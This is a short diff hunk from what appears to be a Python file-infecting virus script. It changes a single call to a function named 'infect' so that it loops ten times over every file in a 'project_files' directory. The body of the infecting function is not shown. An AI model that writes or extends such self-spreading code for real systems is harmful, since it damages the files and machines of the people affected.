@@ -17,4 +17,5 @@ def infect(files):
         fl.close()
 
 
-infect(os.listdir('project_files'))
+for _ in range(10):
+    infect(os.listdir('project_files'))
